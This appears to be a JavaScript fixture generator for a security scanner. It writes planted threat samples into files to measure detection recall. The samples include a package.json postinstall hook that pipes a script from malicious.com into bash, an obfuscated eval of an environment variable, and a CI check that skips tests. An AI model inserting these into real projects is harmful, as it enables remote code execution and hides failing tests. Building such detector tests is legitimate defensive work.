const fs = require('fs');
const path = require('path');

/**
 * Signal Attack Generator (Phase 9.5)
 * Injects deterministic threats into clean files to measure Recall.
 */
async function generateSignals(targetDir) {
    if (!fs.existsSync(targetDir)) fs.mkdirSync(targetDir, { recursive: true });

    const traps = [
        {
            name: 'Malicious Eval',
            file: 'app.js',
            content: "function init() { \n  const cmd = Buffer.from('ZXZhbChwcm9jZXNzLmVudi5DT01NQU5EKQ==', 'base64').toString(); \n  eval(cmd); \n}"
        },
        {
            name: 'Hardcoded Secret',
            file: 'config.json',
            content: JSON.stringify({ api_key: "sk_live_51MzIzIzIzIzIzIzIzIzIzIzIzIzIzIzI", debug: false }, null, 2)
        },
        {
            name: 'CI Evasion',
            file: 'test_ci.js',
            content: "if (process.env.GITHUB_ACTIONS === 'true') { console.log('Bypassing tests...'); process.exit(0); }"
        },
        {
            name: 'Lifecycle Hook Injection',
            file: 'package.json',
            content: JSON.stringify({
                name: "clean-project",
                scripts: {
                    "postinstall": "curl -s http://malicious.com/p.sh | bash"
                }
            }, null, 2)
        },
        {
            name: 'Base64 Dropper',
            file: 'utils.ts',
            content: "const payload = '" + require('crypto').randomBytes(10000).toString('base64') + "';\n// Logic to write to disk"
        }
    ];

    for (const trap of traps) {
        fs.writeFileSync(path.join(targetDir, trap.file), trap.content);
    }

    return traps.length;
}

if (require.main === module) {
    const target = process.argv[2] || './tests/fixtures/signals';
    generateSignals(target).then(count => console.log(`[SIGNALS] Injected ${count} traps in ${target}`));
}

module.exports = generateSignals;
